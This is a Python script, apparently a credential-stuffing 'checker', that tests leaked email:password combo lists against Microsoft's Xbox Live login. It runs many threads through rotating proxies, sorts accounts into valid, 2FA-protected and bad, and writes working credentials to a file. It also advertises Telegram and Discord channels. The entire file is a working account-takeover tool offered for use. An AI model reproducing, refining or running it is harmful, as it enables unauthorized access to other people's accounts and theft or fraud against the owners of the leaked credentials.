import requests
import re
import time
from urllib.parse import urlparse, parse_qs
from colorama import Fore
import random
from tkinter import filedialog
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []

hits, bad, twofa, retries, checked, cpm, valid_mail = 0, 0, 0, 0, 0, 0, 0

def get_proxy():
    if len(proxylist) > 0:
        return {'http': random.choice(proxylist), 'https': random.choice(proxylist)}
    return None

def get_urlPost_sFTTag(session):
    global retries
    while True:  
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except:
            pass
        retries += 1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, hits, valid_mail
    tries = 0
    while tries < 5: 
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password}")
                    with open("valid_mail.txt", 'a') as file:
                        file.write(f"{email}:{password}\n")
                    hits += 1
                    return True
            elif 'cancel?mkt=' in login_request.text:
                print(Fore.MAGENTA + f"2FA: {email}:{password}")
                twofa += 1
                checked += 1
                cpm += 1
                return False
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn\'t exist.", "sign in to your microsoft account"]):
                print(Fore.RED + f"Bad: {email}:{password}")
                bad += 1
                checked += 1
                cpm += 1
                return False
            else:
                retries += 1
                tries += 1
        except:
            retries += 1
            tries += 1
    bad += 1
    checked += 1
    cpm += 1
    print(Fore.RED + f"Bad: {email}:{password}")
    return False

def Load():
    global Combos
    filename = filedialog.askopenfile(mode='r', title='Choose a Combo file', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
    if filename is None:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        Load()
    else:
        try:
            with open(filename.name, 'r', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.MAGENTA + f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.MAGENTA + f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            Load()

def LoadProxies():
    global proxylist
    try:
        with open('proxy.txt', 'r', encoding='utf-8') as e:
            proxylist = [line.strip() for line in e.readlines()]
            print(Fore.MAGENTA + f"[{len(proxylist)}] Proxies Loaded.")
    except:
        print(Fore.LIGHTRED_EX + "Your proxy file is probably harmed.")
        time.sleep(2)
        LoadProxies()

def authenticate(email, password):
    try:
        session = requests.Session()
        session.proxies = get_proxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if urlPost and sFTTag:
            get_xbox_rps(session, email, password, urlPost, sFTTag)
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    finally:
        session.close()

def Main():
    print(Fore.MAGENTA + "t.me/x25191173 / discord.gg/clown / t.me/clownshub")
    print(Fore.MAGENTA + "Select your combos")
    Load()
    LoadProxies()
    try:
        num_threads = int(input(Fore.MAGENTA + "Enter the number of threads to use: "))
    except ValueError:
        print(Fore.RED + "Invalid number. Using default value of 5 threads.")
        num_threads = 5

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(authenticate, *combo.strip().split(":")) for combo in Combos if ":" in combo]
        concurrent.futures.wait(futures)

Main()